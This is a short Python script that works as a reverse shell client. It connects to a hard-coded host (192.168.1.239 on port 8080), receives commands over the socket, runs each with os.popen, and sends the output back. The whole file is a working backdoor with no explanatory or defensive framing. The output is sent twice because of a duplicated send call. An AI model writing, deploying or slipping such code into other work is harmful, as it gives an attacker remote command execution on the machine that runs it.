import socket
import os

def main():
	s = socket.socket()
	host = '192.168.1.239'
	port = 8080
	try:
		s.connect((host,port))
		print('Connected to the server')
		while True:
			try:
				command = s.recv(1024)
				command = command.decode() #print(command)
				stream = os.popen(command)
				output = stream.read()  #print(output)
				s.send(output.encode()) #print(output)
				if output == None or output == '' or output == ' ':
					s.send('Output executed'.encode())
					
				else:
					s.send(output.encode())
					
			except Exception as e:
				print(e)
			command = None
	except Exception as e:
		print(e)
if __name__ == '__main__':
	main()